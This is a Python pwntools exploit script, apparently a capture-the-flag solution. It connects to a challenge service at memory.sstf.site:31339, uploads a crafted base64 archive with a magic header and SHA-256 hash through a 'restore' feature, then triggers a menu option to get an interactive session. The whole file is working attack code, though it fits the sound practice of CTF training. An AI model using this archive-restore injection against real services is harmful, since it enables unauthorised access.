from pwn import * 
import struct
import hashlib
import base64
import hexdump

#context.log_level = 'debug'

class pwntools:
    p = 0;
    binary = 0;
    def __init__(self,binary,port=None):
        self.binary = binary
        self.port = port
        if port is None:
            self.p = process(self.binary)
        else:
            self.p = remote(self.binary,self.port)
        self.getMenu()
        
    def recv(self,until=None):
        if until==None:
            return self.p.recv()
        else:
            return self.p.recvuntil(until)

    def send(self,value):
        self.p.send(value)
    
    def getMenu(self):
        self.recv("menu : ")
        
    def trigger(self):
        print("--------trigger start----------")
        self.send("4\n")
        self.p.interactive()
        #self.getMenu()
        
    
    def restore(self,size,exp):
        print("------------restore start--------------")
        self.send("5\n");
        self.recv("size : ")
        self.send(str(size)+"")
        self.recv("binary contents : ")
        self.send(exp+b"\n")
        self.recv("hash: ")
        self.getMenu()
        print("------------restore done--------------")       
        
    def getBackupData(self):
        print("------------backup start--------------")
        self.send("4\n")
        print(self.recv())
        print(self.recv("Contents\n"))

    

    
m = hashlib.sha256()
res = open("./hack.tar","rb")
res = res.read()
m.update(res)
hash_array = m.digest()
magic = b"SCTF"

print(len(res))
exp = magic + struct.pack("<i",len(res))+hash_array+res
sitename_base64 = base64.b64encode(exp)
#print("size is {}".format(len(sitename_base64)))
#print("contents is {}".format(sitename_base64))
#e = open("encode_data","wb")
#e.write(sitename_base64);
#e.close()
#decode_name = base64.b64decode(sitename_base64)
#hexdump.hexdump(decode_name[40:])

pt = pwntools("memory.sstf.site",31339)
#pt = pwntools("localhost",31339)
pt.restore(len(sitename_base64),sitename_base64)
pt.trigger()
